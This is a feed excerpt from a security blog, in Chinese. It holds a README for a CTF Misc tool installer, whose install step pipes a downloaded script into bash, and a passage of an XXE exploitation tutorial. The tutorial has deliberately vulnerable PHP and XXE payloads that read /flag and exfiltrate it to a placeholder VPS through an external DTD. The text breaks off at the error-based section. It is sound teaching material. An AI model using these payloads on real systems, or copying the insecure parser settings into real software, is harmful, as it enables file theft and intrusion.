    <content type="html"><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>一个自动部署Misc工具的<del>轻量</del>sh脚本<br>闲的无聊随便写的小玩意（部分代码由chatgpt完成）<br>适合在新环境中快速搭建misc环境</p><p><a href="https://github.com/lewiserii/auto_deploy">项目地址</a></p><h1 id="目前支持的功能"><a href="#目前支持的功能" class="headerlink" title="目前支持的功能"></a>目前支持的功能</h1><p>1：换源，允许root登录（ubuntu），开启ssh等基础操作<br>2：安装docker<br>3：安装docker-compose<br>4：安装golang<br>5：安装java<br>6：安装linux下的部分misc工具，具体如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>sstv<br>steghide<br>stegpy<br>stegseek<br>volatility2<br>volatility3<br>webp<br>zsteg<br></code></pre></td></tr></table></figure><h1 id="支持的系统"><a href="#支持的系统" class="headerlink" title="支持的系统"></a>支持的系统</h1><p>1：ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04<br>2：<del>centos7&#x2F;8</del>(只有部分功能适配了centos)</p><p>推荐ubuntu20</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>本脚本可重复运行安装<br>工具保存在运行脚本的<code>misc_tools</code>目录下</p><p>方法一：<br>git clone <a href="https://github.com/lewiserii/auto_deploy">https://github.com/lewiserii/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              基础配置(换源，root，ssh)<br>        docker              安装docker<br>        docker-compoer      安装docker-compose<br>        go                  安装golang<br>        java                安装java<br>        misc-tools          安装misc工具<br></code></pre></td></tr></table></figure><p>方法二：<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh</a>) [mode]</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/auto_deploy/auto_deploy.gif"></p><h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加python安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除python，新增golang和java<br>V2.1：增加CTF-Misc部分工具的安装<br>V2.2：优化可重复运行脚本逻辑</p><h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加web系列工具</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;auto-deploy&quot;&gt;&lt;a href=&quot;#auto-deploy&quot; class=&quot;headerlink&quot; title=&quot;auto_deploy&quot;&gt;&lt;/a&gt;auto_deploy&lt;/h1&gt;&lt;p&gt;一个自动部署Misc工具的&lt;del&gt;轻量&lt;/del&gt;sh脚本&lt;br&gt;</summary>
      
    
    
    
    <category term="脚本" scheme="https://www.lewiserii.top/categories/%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="misc" scheme="https://www.lewiserii.top/tags/misc/"/>
    
    <category term="sh" scheme="https://www.lewiserii.top/tags/sh/"/>
    
    <category term="脚本" scheme="https://www.lewiserii.top/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-15T04:00:00.000Z</published>
    <updated>2023-06-24T05:07:21.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从XML到XXE"><a href="#从XML到XXE" class="headerlink" title="从XML到XXE"></a>从XML到XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p><p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p></blockquote><p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义（可选）</code>、<code>文档元素</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML申明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(文档类型定义，Document Type Definition )的作用是定义<code>XML</code>文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h3 id="DTD引用方式"><a href="#DTD引用方式" class="headerlink" title="DTD引用方式"></a>DTD引用方式</h3><p>1）DTD 内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>2）DTD 外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p><p>3）引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p><h3 id="DTD-关键字"><a href="#DTD-关键字" class="headerlink" title="DTD 关键字"></a>DTD 关键字</h3><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体&#x2F;普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>内置实体</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;符号: &amp;amp;<br>单引号: &amp;apos;<br>＞: &amp;gt;<br>＜: &amp;lt;<br>双引号: &amp;quot;<br></code></pre></td></tr></table></figure><p><strong>字符实体</strong></p><p>通常是<code>html</code>的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&amp;#169</code>即<code>©</code></p><p><strong>普通实体</strong></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="内部实体与外部实体"><a href="#内部实体与外部实体" class="headerlink" title="内部实体与外部实体"></a>内部实体与外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体。</p><p>内部实体：<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p><p>外部实体：<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p>通用实体：<br>用<code>&amp;实体名;</code>引用的实体，他在<code>DTD</code>中定义，在<code>XML</code>文档中引用</p><p>参数实体：<br>使用<code>% 实体名</code>在<code>DTD</code>中定义，并且只能在<code>DTD</code>中使用<code>%实体名;</code>引用<br>只有在<code>DTD</code>文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p><h3 id="不同程序支持的协议"><a href="#不同程序支持的协议" class="headerlink" title="不同程序支持的协议"></a>不同程序支持的协议</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-4.png"></p><blockquote><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><p>PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-9.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><h1 id="XXE的几种利用方式"><a href="#XXE的几种利用方式" class="headerlink" title="XXE的几种利用方式"></a>XXE的几种利用方式</h1><h2 id="有回显任意文件读取-Normal-Based-XXE"><a href="#有回显任意文件读取-Normal-Based-XXE" class="headerlink" title="有回显任意文件读取(Normal Based XXE)"></a>有回显任意文件读取(Normal Based XXE)</h2><p>服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取客户端输入内容</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//初始化XML解析器</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//加载客户端输入的XML内容</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-1.png"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>如果读取的文件中包含特殊符号，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>等，就会返回一些报错信息</p><p>这时可以使用<code>CDATA</code>或者<code>base64 convert</code></p><p>术语<code>CDATA</code>指的是不应由<code>XML解析器</code>进行解析的文本数据<code>（Unparsed Character Data）</code><br><code>CDATA</code>部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束，解析器会忽略<code>CDATA</code>部分中的所有内容</p><p>我们的思路就是把读取的文件放在CDATA中之后再调用</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过使用这个payload读文件时还是会报错，因为在<code>xml</code>中，<code>xml</code>解析器有个限制：不能在内部<code>Entity</code>中引用，<code>“PEReferences forbidden in internal subset in Entity ”</code>指的就是禁止内部参数实体引用</p><p>所以需要调用的外部的<code>dtd</code></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-2.png"></p><h2 id="无回显任意文件读取-Blind-Based-XXE"><a href="#无回显任意文件读取-Blind-Based-XXE" class="headerlink" title="无回显任意文件读取(Blind Based XXE)"></a>无回显任意文件读取(Blind Based XXE)</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-3.png"></p><p>先调用了<code>%remote</code>，请求远程服务器上的<code>evil.dtd</code>，类似php的<code>include</code>，然后<code>%int</code>调用<code>%file</code>，<code>%file</code>获取敏感文件后将结果填入到<code>%send</code>，最后调用<code>%send</code>把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有<code>%</code>, 所以将其转成html实体编码</p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>以上都是引入外部服务器的<code>OOB XXE（Out-of-band）</code>，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p><p>这时候就可以考虑利用本地dtd来进行XXE</p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>引用内部实体payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于报错的XXE-Error-Based-XXE"><a href="#基于报错的XXE-Error-Based-XXE" class="headerlink" title="基于报错的XXE(Error Based 